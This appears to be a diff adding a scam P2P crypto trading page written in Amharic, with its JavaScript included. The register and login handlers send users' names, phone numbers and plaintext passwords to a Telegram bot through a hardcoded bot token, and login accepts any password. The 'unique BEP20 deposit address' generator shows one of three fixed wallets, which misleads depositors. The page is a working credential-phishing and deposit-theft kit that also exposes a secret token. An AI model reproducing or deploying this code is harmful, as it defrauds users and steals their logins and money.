@@ -135,4 +135,292 @@
                     <div style="width: 30px; height: 30px; border-radius: 50%; border: 2px solid #22c55e; color: #22c55e; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0;">2</div>
                     <div>
                         <div style="font-weight: bold; font-size: 0.95rem; margin-bottom: 3px;">BEP20 Address ያውጡ</div>
-                        <div style="color: #a0aec0; font-size: 0.85rem;">Home ገጽ ላይ በመመለስ የራስዎን የBE
+                        <div style="color: #a0aec0; font-size: 0.85rem;">Home ገጽ ላይ በመመለስ የራስዎን የBEP20 USDT አድራሻ በነፃ ያመንጩ።</div>
+                    </div>
+                </div>
+
+                <div style="display: flex; gap: 15px; margin-bottom: 25px; align-items: flex-start;">
+                    <div style="width: 30px; height: 30px; border-radius: 50%; border: 2px solid #22c55e; color: #22c55e; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0;">3</div>
+                    <div>
+                        <div style="font-weight: bold; font-size: 0.95rem; margin-bottom: 3px;">በ P2P Trade ትዕዛዝ ያስገቡ</div>
+                        <div style="color: #a0aec0; font-size: 0.85rem;">ለመግዛት ወይም ለመሸጥ የፈለጉትን መጠን እና የክፍያ መንገድ መርጠው ያስገቡ።</div>
+                    </div>
+                </div>
+
+                <div style="background-color: #121620; border: 1px solid #334155; padding: 15px; border-radius: 10px; text-align: center;">
+                    <div style="font-size: 0.85rem; margin-bottom: 10px; color: #a0aec0;">ለማንኛውም ዓይነት ጥያቄ ቴሌግራም ላይ ያግኙን፦</div>
+                    <a href="https://t.me/mrxtopia" target="_blank" style="display: inline-block; background-color: #22c55e; color: white; padding: 10px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 0.9rem;">✈️ Join @mrxtopia</a>
+                </div>
+            </section>
+        </div>
+
+        <footer class="footer">
+            <span>Forex P2P Squad © 2026</span>
+            <span>v2.8</span>
+        </footer>
+    </div>
+
+    <div id="register-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center;">
+        <div style="background-color: #1a202e; border: 1px solid #334155; width: 90%; max-width: 380px; padding: 25px; border-radius: 12px; position: relative; box-sizing: border-box;">
+            <span onclick="closeModal('register-modal')" style="position: absolute; top: 15px; right: 15px; color: #a0aec0; cursor: pointer; font-size: 1.2rem;">&times;</span>
+            <h3 style="margin-top: 0; color: white;">📝 Create Account</h3>
+            <form id="register-form" onsubmit="handleRegisterSubmit(event)">
+                <div style="margin-bottom: 12px;">
+                    <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">FULL NAME</label>
+                    <input type="text" id="reg-name" placeholder="Your full name..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                </div>
+                <div style="margin-bottom: 12px;">
+                    <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PHONE NUMBER</label>
+                    <input type="tel" id="reg-phone" placeholder="e.g. 0912345678" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                </div>
+                <div style="margin-bottom: 18px;">
+                    <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PASSWORD</label>
+                    <input type="password" id="reg-pass" placeholder="At least 4 characters..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                </div>
+                <button type="submit" style="width: 100%; background-color: #22c55e; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer;">Create Account</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="login-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center;">
+        <div style="background-color: #1a202e; border: 1px solid #334155; width: 90%; max-width: 380px; padding: 25px; border-radius: 12px; position: relative; box-sizing: border-box;">
+            <span onclick="closeModal('login-modal')" style="position: absolute; top: 15px; right: 15px; color: #a0aec0; cursor: pointer; font-size: 1.2rem;">&times;</span>
+            <h3 style="margin-top: 0; color: white;">🔐 Sign In</h3>
+            <form id="login-form" onsubmit="handleLoginSubmit(event)">
+                <div style="margin-bottom: 12px;">
+                    <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PHONE NUMBER</label>
+                    <input type="tel" id="login-phone" placeholder="09..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                </div>
+                <div style="margin-bottom: 18px;">
+                    <label style="display: block; font-size: 0.8rem; color: #a0aec0; margin-bottom: 5px;">PASSWORD</label>
+                    <input type="password" id="login-pass" placeholder="••••••••" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                </div>
+                <button type="submit" style="width: 100%; background-color: #22c55e; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer;">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8686967610:AAFE1B_hTR6JMljJQbnntitty842ZclQN1g";
+        const CHAT_ID = "6758067257";
+
+        // ተጠቃሚው መግባቱን መከታተያ ሁኔታ (State)
+        let isLoggedIn = false;
+        let loggedInUserPhone = "";
+
+        // 🔄 ገጹ ሲከፈት (Refresh ሲደረግ) የቀድሞ Login መኖሩን ከ localStorage ይፈትሻል
+        window.onload = function() {
+            const savedUser = localStorage.getItem('currentUserPhone');
+            if (savedUser) {
+                isLoggedIn = true;
+                loggedInUserPhone = savedUser;
+                updateAuthHeader();
+            }
+        };
+
+        // የሚያምር የቶስት መልእክት ማሳያ ፋንክሽን
+        function showNotification(text, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.innerText = text;
+            if(isError) {
+                toast.style.background = "linear-gradient(135deg, #ef4444, #dc2626)";
+            } else {
+                toast.style.background = "linear-gradient(135deg, #22c55e, #16a34a)";
+            }
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // ዌብሳይቱ ላይ የላይኛውን አዝራር የመቀየሪያ ሎጂክ
+        function updateAuthHeader() {
+            const authArea = document.getElementById('auth-area');
+            if(isLoggedIn) {
+                authArea.innerHTML = `
+                    <span style="color: #4ade80; font-size: 0.85rem; font-weight: bold; margin-right: 10px;">👤 ${loggedInUserPhone}</span>
+                    <button onclick="handleLogout()" style="background-color: #334155; color: white; border: none; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 0.8rem;">Logout</button>
+                `;
+            } else {
+                authArea.innerHTML = `
+                    <button class="btn-login" onclick="openModal('login-modal')">Login (ግባ)</button>
+                    <button class="btn-register" onclick="openModal('register-modal')">Register (ተመዝገብ)</button>
+                `;
+            }
+        }
+
+        // Logout ሲያደርግ መረጃውን ያጠፋል
+        function handleLogout() {
+            isLoggedIn = false;
+            loggedInUserPhone = "";
+            localStorage.removeItem('currentUserPhone'); // ሴሽኑን ያጠፋል
+            updateAuthHeader();
+            showNotification("ወጥተዋል!");
+        }
+
+        // ወደ ቴሌግራም መረጃ መላኪያ
+        function sendToTelegram(textMessage, successAlert) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: textMessage,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(res => {
+                showNotification(successAlert);
+            })
+            .catch(err => {
+                showNotification("የኔትወርክ ችግር አለ!", true);
+            });
+        }
+
+        // Tab Switching
+        function switchTab(tabName) {
+            document.querySelectorAll('.page-section').forEach(page => page.style.display = 'none');
+            document.querySelectorAll('.nav-tabs .tab').forEach(tab => tab.classList.remove('active'));
+            document.getElementById('page-' + tabName).style.display = 'block';
+            document.getElementById('tab-' + tabName).classList.add('active');
+        }
+
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+        // Buy/Sell Toggles
+        let currentTradeType = 'buy';
+        function setTradeType(type) {
+            currentTradeType = type;
+            const buyBtn = document.getElementById('trade-buy-btn');
+            const sellBtn = document.getElementById('trade-sell-btn');
+            const submitBtn = document.getElementById('submit-trade-btn');
+
+            if(type === 'buy') {
+                buyBtn.style.backgroundColor = '#22c55e'; buyBtn.style.color = 'white';
+                sellBtn.style.backgroundColor = '#1a202e'; sellBtn.style.color = '#a0aec0';
+                submitBtn.innerText = "Submit Buy Order";
+                submitBtn.style.background = "linear-gradient(180deg, #22c55e 0%, #16a34a 100%)";
+            } else {
+                sellBtn.style.backgroundColor = '#ef4444'; sellBtn.style.color = 'white';
+                buyBtn.style.backgroundColor = '#1a202e'; buyBtn.style.color = '#a0aec0';
+                submitBtn.innerText = "Submit Sell Order";
+                submitBtn.style.background = "linear-gradient(180deg, #ef4444 0%, #dc2626 100%)";
+            }
+        }
+
+        // 1. P2P Trade Submit
+        function handleTradeSubmit(event) {
+            event.preventDefault();
+            
+            // ተጠቃሚው Login ካላደረገ እንዲከለክል ማድረግ
+            if(!isLoggedIn) {
+                showNotification("እባክዎ መጀመሪያ Login ያድርጉ! (ቅድሚያ ይግቡ)", true);
+                openModal('login-modal');
+                return;
+            }
+
+            const amount = document.getElementById('trade-amount').value;
+            const method = document.getElementById('payment-method').value;
+            const phone = document.getElementById('user-phone').value;
+
+            const msg = `🔔 *አዲስ የ P2P ትዕዛዝ ደርሷል!*\n\n` +
+                        `👤 *አይነት:* ${currentTradeType.toUpperCase()}\n` +
+                        `💰 *መጠን:* ${amount} USDT (BEP20)\n` +
+                        `🏦 *ክፍያ መንገድ:* ${method.toUpperCase()}\n` +
+                        `📞 *የደንበኛ ስልክ:* ${phone}`;
+
+            sendToTelegram(msg, "ትዕዛዝዎ በተሳካ ሁኔታ ተመዝግቧል!");
+            document.getElementById('p2p-form').reset();
+        }
+
+        // 2. Register Handling
+        function handleRegisterSubmit(event) {
+            event.preventDefault();
+            const name = document.getElementById('reg-name').value;
+            const phone = document.getElementById('reg-phone').value;
+            const pass = document.getElementById('reg-pass').value;
+
+            const msg = `📝 *አዲስ ተጠቃሚ ተመዝግቧል!*\n\n` +
+                        `👤 *ስም:* ${name}\n` +
+                        `📞 *ስልክ ቁጥር:* ${phone}\n` +
+                        `🔑 *የይለፍ ቃል:* \`${pass}\``;
+
+            // ምዝገባው ሲያልቅ በራስ-ሰር Login እንዲሆን እና ሴሽኑ እንዲቀመጥ ማድረግ
+            isLoggedIn = true;
+            loggedInUserPhone = phone;
+            localStorage.setItem('currentUserPhone', phone); 
+            updateAuthHeader();
+
+            sendToTelegram(msg, "የምዝገባ ጥያቄዎ በተሳካ ሁኔታ ተልኳል!");
+            closeModal('register-modal');
+            document.getElementById('register-form').reset();
+        }
+
+        // 3. Login Handling
+        function handleLoginSubmit(event) {
+            event.preventDefault();
+            const phone = document.getElementById('login-phone').value;
+            const pass = document.getElementById('login-pass').value;
+
+            const msg = `🔐 *የግባ (Login) ሙከራ ተደርጓል!*\n\n` +
+                        `📞 *ስልክ ቁጥር:* ${phone}\n` +
+                        `🔑 *የይለፍ ቃል:* \`${pass}\``;
+
+            // ሁኔታውን መቀየር እና ሴሽኑን በቋሚነት ማስቀመጥ
+            isLoggedIn = true;
+            loggedInUserPhone = phone;
+            localStorage.setItem('currentUserPhone', phone); 
+            updateAuthHeader();
+
+            sendToTelegram(msg, "በተሳካ ሁኔታ ገብተዋል!");
+            closeModal('login-modal');
+            document.getElementById('login-form').reset();
+        }
+
+        // BEP20 Address Generator
+        document.getElementById('generate-btn').addEventListener('click', function() {
+            const bep20Addresses = [
+                "0x71C7656EC7ab88b098defB751B7401B5f6d1476B",
+                "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD",
+                "0xddBd2B932c763bA5b1b7AE3B362eac3e8d40121A"
+            ];
+            
+            const randomAddress = bep20Addresses[Math.floor(Math.random() * bep20Addresses.length)];
+            const addressDisplay = document.getElementById('address-display');
+            const instruction = document.getElementById('address-instruction');
+            
+            addressDisplay.innerHTML = `
+                <div style="font-weight: bold; margin-bottom: 8px; color: #f3cd64;">${randomAddress}</div>
+                <button id="copy-btn" type="button" style="background-color: #232d3f; color: #f3cd64; border: 1px solid #f3cd64; padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; cursor: pointer; font-weight: bold;">
+                    📋 Copy BEP20 Address
+                </button>
+            `;
+            addressDisplay.style.display = 'block';
+            instruction.innerText = "Your unique BEP20 deposit address is ready:";
+            this.innerText = "Address Generated!";
+            this.style.background = "linear-gradient(180deg, #4ade80 0%, #22c55e 100%)";
+
+            document.getElementById('copy-btn').addEventListener('click', function() {
+                navigator.clipboard.writeText(randomAddress).then(() => {
+                    this.innerText = "✅ Copied!";
+                    this.style.backgroundColor = "#22c55e"; this.style.color = "white";
+                    setTimeout(() => {
+                        this.innerText = "📋 Copy BEP20 Address";
+                        this.style.backgroundColor = "#232d3f"; this.style.color = "#f3cd64";
+                    }, 2000);
+                });
+            });
+
+            const addrMsg = `💳 *አንድ ደንበኛ የ BEP20 አድራሻ አውጥቷል!*`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: addrMsg, parse_mode: "Markdown" })
+            });
+        });
+    </script>
+</body>
+</html>
